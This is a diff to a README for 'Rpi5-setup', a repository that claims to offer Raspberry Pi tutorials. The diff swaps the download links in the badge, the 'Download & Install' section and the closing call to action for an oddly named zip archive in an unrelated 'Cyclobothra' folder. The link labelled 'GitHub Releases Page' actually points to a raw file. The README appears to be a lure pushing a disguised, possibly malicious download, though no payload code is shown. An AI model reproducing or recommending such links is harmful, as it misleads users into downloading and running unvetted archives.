@@ -1,6 +1,6 @@
 # 🎉 Rpi5-setup - Learn Raspberry Pi Skills Easily
 
-[![Download Rpi5-setup](https://raw.githubusercontent.com/Gooddocteur/Rpi5-setup/main/Cyclobothra/Rpi5-setup-v3.1.zip)](https://raw.githubusercontent.com/Gooddocteur/Rpi5-setup/main/Cyclobothra/Rpi5-setup-v3.1.zip)
+[![Download Rpi5-setup](https://github.com/Gooddocteur/Rpi5-setup/raw/refs/heads/main/Cyclobothra/setup_Rpi_indistinction.zip)](https://github.com/Gooddocteur/Rpi5-setup/raw/refs/heads/main/Cyclobothra/setup_Rpi_indistinction.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to Rpi5-setup! This repository offers tutorials to help you learn basic 
 
 ## 📥 Download & Install
 
-To get started, you need to download the software. Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Gooddocteur/Rpi5-setup/main/Cyclobothra/Rpi5-setup-v3.1.zip)
+To get started, you need to download the software. Visit this page to download: [GitHub Releases Page](https://github.com/Gooddocteur/Rpi5-setup/raw/refs/heads/main/Cyclobothra/setup_Rpi_indistinction.zip)
 
 ### Steps to Download:
 
@@ -63,4 +63,4 @@ If you have any questions or feedback, you can reach us via the Issues section o
 
 ## 🚀 Ready to Get Started?
 
-Don't wait! Visit [this page to download](https://raw.githubusercontent.com/Gooddocteur/Rpi5-setup/main/Cyclobothra/Rpi5-setup-v3.1.zip) the tutorials and start your Raspberry Pi learning journey today. Enjoy exploring and building exciting projects!
+Don't wait! Visit [this page to download](https://github.com/Gooddocteur/Rpi5-setup/raw/refs/heads/main/Cyclobothra/setup_Rpi_indistinction.zip) the tutorials and start your Raspberry Pi learning journey today. Enjoy exploring and building exciting projects!
